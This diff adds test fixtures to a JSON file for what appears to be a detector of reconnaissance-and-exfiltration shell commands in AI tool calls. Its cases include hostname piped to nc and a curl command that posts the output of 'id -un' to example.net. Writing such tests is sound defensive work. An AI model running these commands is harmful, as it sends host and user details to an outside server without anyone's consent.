@@ -58,5 +58,35 @@
     "text": "hostname | nc example.net 9000",
     "shouldMatch": false,
     "eventKind": "response"
+  },
+  {
+    "label": "id run before an unrelated request",
+    "text": "id; curl -s http://example.net/x",
+    "shouldMatch": false,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "hostname run before an unrelated request",
+    "text": "hostname && curl -s http://example.net/",
+    "shouldMatch": false,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "recon word quoted by echo",
+    "text": "echo \"hostname\" && curl -s http://example.net/",
+    "shouldMatch": false,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "recon and transfer quoted into a notes file",
+    "text": "echo \"cat /etc/resolv.conf; curl http://example.net/u\" > notes.txt",
+    "shouldMatch": false,
+    "eventKind": "tool_use"
+  },
+  {
+    "label": "user name sent in a backquoted substitution",
+    "text": "curl -s http://example.net/c -d \"u=`id -un`\"",
+    "shouldMatch": true,
+    "eventKind": "tool_use"
   }
 ]
